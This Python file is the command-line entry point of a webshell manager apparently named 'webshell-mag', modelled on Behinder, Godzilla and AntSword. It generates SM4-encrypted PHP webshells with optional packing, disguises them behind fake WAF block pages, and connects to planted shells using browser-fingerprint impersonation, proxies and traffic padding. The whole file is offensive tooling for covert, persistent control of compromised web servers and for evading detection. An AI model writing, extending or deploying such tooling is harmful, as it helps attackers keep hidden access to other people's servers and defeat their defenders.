"""Command line entry point.

    webshell-mag                          # start the Qt6 GUI
    webshell-mag --generate shell.php     # write a fresh SM4 shell and print its key/iv
    webshell-mag --url http://x/shell.php --key <hex> --iv <hex>   # GUI + immediate connect
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from . import __version__, payloads
from .config import ShellConfig


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="webshell-mag",
        description="SM4-CBC webshell manager (Behinder/Godzilla/AntSword inspired)",
    )
    parser.add_argument("--version", action="version", version=f"webshell-mag {__version__}")

    gen = parser.add_argument_group("payload generation")
    gen.add_argument("--generate", metavar="FILE", help="write a PHP shell to FILE and print its credentials")
    gen.add_argument("--proto", choices=["v1", "v2"], default="v2", help="wire protocol (default: v2)")
    gen.add_argument("--key", help="v1: 32 hex chars (default: random)")
    gen.add_argument("--iv", help="v1: 32 hex chars (default: random)")
    gen.add_argument("--secret", help="v2: 64 hex chars (default: random)")
    gen.add_argument("--salt", help="v2: 32 hex chars (default: random)")
    gen.add_argument("--hardening", choices=["plain", "light", "packed"], default="plain")
    gen.add_argument("--carrier", default="form", help="recommended carrier for the session")
    gen.add_argument("--pass-param", default="", help="request parameter name (default: random)")
    gen.add_argument("--decoy", metavar="FILE", help="HTML page returned on invalid requests (405)")
    gen.add_argument("--decoy-preset", choices=["aliyun", "anyu", "safedog", "safeline", "tmshen", "tsec", "wangsu"],
                     help="built-in WAF-looking page from src/wshell/payloads/decoys")
    gen.add_argument("--print-only", action="store_true", help="print the payload instead of writing it")

    conn = parser.add_argument_group("quick connect")
    conn.add_argument("--url", help="shell URL; opens the GUI and connects immediately")
    conn.add_argument("--name", default="quick", help="session name for --url")
    conn.add_argument("--body-mode", choices=["form", "raw"], default="form")
    conn.add_argument("--timeout", type=float, default=20.0)
    conn.add_argument("--proxy", default="")
    conn.add_argument("--pad", type=int, default=0, help="v2 request padding bucket (0=off)")
    conn.add_argument("--transport", choices=["requests", "curl_cffi"], default="requests")
    conn.add_argument("--probe", action="store_true", help="ping/info/echo test then exit (no GUI)")
    conn.add_argument("--impersonate", default="chrome", help="curl_cffi fingerprint, e.g. chrome131")
    return parser


def generate_payload(args: argparse.Namespace) -> int:
    key = bytes.fromhex(args.key) if args.key else None
    iv = bytes.fromhex(args.iv) if args.iv else None
    source = payloads.generate_php(
        key=key,
        iv=iv,
        pass_param=args.pass_param,
        proto=args.proto,
        secret=args.secret,
        salt=args.salt,
        hardening=args.hardening,
        carrier=args.carrier,
        decoy=(
            Path(args.decoy).read_text(encoding="utf-8")
            if args.decoy
            else (
                (payloads.decoy_path(args.decoy_preset).read_text(encoding="utf-8"))
                if args.decoy_preset and payloads.decoy_path(args.decoy_preset)
                else ""
            )
        ),
    )
    if args.print_only or not args.generate:
        sys.stdout.write(source.code)
        return 0
    target = Path(args.generate)
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(source.code, encoding="utf-8")
    credentials = {
        "file": str(target),
        "url": f"http://TARGET/{target.name}",
        "proto": source.proto,
        "key": source.key_hex,
        "iv": source.iv_hex,
        "secret": source.secret_hex,
        "salt": source.salt_hex,
        "pass_param": source.pass_param,
        "hardening": source.hardening,
        "carrier": source.carrier,
        "body_mode": args.body_mode,
    }
    print(json.dumps(credentials, indent=2, ensure_ascii=False))
    return 0


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if getattr(args, "probe", False):
        return probe(args)
    if args.generate or args.print_only:
        return generate_payload(args)

    quick = None
    if args.url:
        quick = ShellConfig(
            name=args.name,
            url=args.url,
            proto=args.proto,
            key=args.key or "",
            iv=args.iv or "",
            secret=args.secret or "",
            salt=args.salt or "",
            pass_param=args.pass_param,
            body_mode=args.body_mode,
            carrier=args.carrier,
            pad_bucket=args.pad,
            timeout=args.timeout,
            proxy=args.proxy,
            transport=args.transport,
            impersonate=args.impersonate,
        )

    from .gui.app import main as gui_main

    return gui_main(argv, quick=quick)


if __name__ == "__main__":
    raise SystemExit(main())
